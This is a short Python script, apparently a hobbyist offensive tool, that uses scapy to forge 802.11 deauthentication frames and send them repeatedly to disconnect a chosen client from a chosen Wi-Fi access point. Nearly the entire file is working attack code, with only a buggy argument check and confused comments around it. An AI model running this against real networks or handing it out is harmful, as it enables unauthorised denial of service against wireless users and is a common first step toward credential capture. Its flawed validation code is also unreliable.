#!/usr/bin/python

#author:h0rac

from scapy.all import *
import sys
import signal


if len(sys.argv) != 4 and type(sys.argv[3]) is not int:
  print "To less arguments, client MAC, bssid, and number of packets to send"
  sys.exit(1)

client = sys.argv[1]
bssid = sys.argv[2]
count = int(sys.argv[3])

# Can't add a RadioTap() layer as the first layer or it's a malformed
# Association request packet?
# Append the packets to a new list so we don't have to hog the lock
# type=0, subtype=12?
packet = Dot11(type=0,subtype=12,addr1=client,addr2=bssid,addr3=bssid)/Dot11Deauth()

def signal_term_handler(signal, frame):
    print 'quiting'
    sys.exit()

signal.signal(signal.SIGINT, signal_term_handler)

def deauth(packet):
  for i in range(count):
    sendp(packet,inter=0.5, iface="en0")
    print "Deauth %s client from %s AP" % (client,bssid)
deauth(packet)
